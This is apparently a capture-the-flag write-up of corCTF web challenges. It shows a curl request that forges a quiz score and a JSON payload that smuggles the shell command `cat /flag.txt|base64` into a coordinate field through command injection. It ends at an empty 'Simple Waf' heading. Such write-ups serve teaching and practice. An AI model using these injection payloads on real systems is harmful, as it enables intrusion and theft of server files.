# 1. JSON QUIZ
Challenge description:
How well do you know JSON? Take this quiz and find out!

Solution:
So, there is a series of 15 questions and we have two chances to pass the test, but even though we make every question correct, it says `the quiz ends by saying you failed, and that your score was in the bottom 30%`.
So looking at the source code, `quiz.js` we can see the following code:
```
function finish() {
    $("#q" + num).classList = "mt-4 question animate__animated animate__fadeOutLeft";
    $("#q" + num + " button").onclick = null;

    const responses = Array.from(document.querySelectorAll(".question"))
        .map(q => [
            q.children[1].innerText,
            Array.from(q.children[2].querySelectorAll("input"))
                .filter(a => a.checked)[0]?.nextElementSibling?.innerText || "???"
        ]);
    console.log(responses);
    
    // TODO: implement scoring somehow
    // kinda lazy, ill figure this out some other time

    setTimeout(() => {
        let score = 0;
        fetch("/submit", {
            method: "POST",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded"
            },
            body: "score=" + score
        })
        .then(r => r.json())
        .then(j => {
            if (j.pass) {
                $("#reward").innerText = j.flag;
                $("#pass").style.display = "block";
            }
            else {
                $("#fail").style.display = "block";
            }
        });
    }, 1250);
}
```
So, it makes a POST request to /submit containing our score, and then responds with either "pass" or "fail". 
But it is by default given as zero, therefore, we get message that we failed.
Sending a post request by setting score=15 gives the flag!
`curl https://jsonquiz.be.ax/submit --data "score=15"`
Flag: corctf{th3_linkedin_JSON_quiz_is_too_h4rd!!!}


# 2. Ms Frog Generator
Challenge Descritpion:The vanilla msfrog is hard to beat, but this webapp allows you to make it even better! 
Solution:
Looking at the request and response of /api/generate, we can see that there is command injection in it.

```
[{"type":"mskiss.png","pos":{"x":"`cat /flag.txt|base64`","y":0}}]
```
This will give the following encoding:
Y29yY3Rme3NoMHVsZF9oNHZlX3IzbmRlcjNkX2NsMTNudF9zMWRlXzptc2Zyb2c6fQo=
Flag: corctf{sh0uld_h4ve_r3nder3d_cl13nt_s1de_:msfrog:}

# 3. Simple Waf


